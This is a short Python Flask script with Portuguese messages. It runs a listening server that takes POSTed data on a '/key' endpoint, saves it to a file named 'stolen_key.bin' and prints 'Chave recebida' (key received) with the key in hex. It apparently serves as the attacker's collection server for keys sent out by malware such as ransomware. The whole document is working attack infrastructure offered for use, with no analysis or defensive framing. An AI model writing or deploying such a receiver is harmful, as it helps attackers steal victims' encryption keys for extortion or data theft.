from flask import Flask, request
import sys

app = Flask(__name__)

@app.route('/key', methods=['POST'])
def save_key():
    key = request.data
    with open("stolen_key.bin", "wb") as f:
        f.write(key)
    print(f"[+] Chave recebida: {key.hex()}")
    return "OK", 200

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Uso: python3 save_key.py <porta>")
        sys.exit(1)
    app.run(host='0.0.0.0', port=int(sys.argv[1]))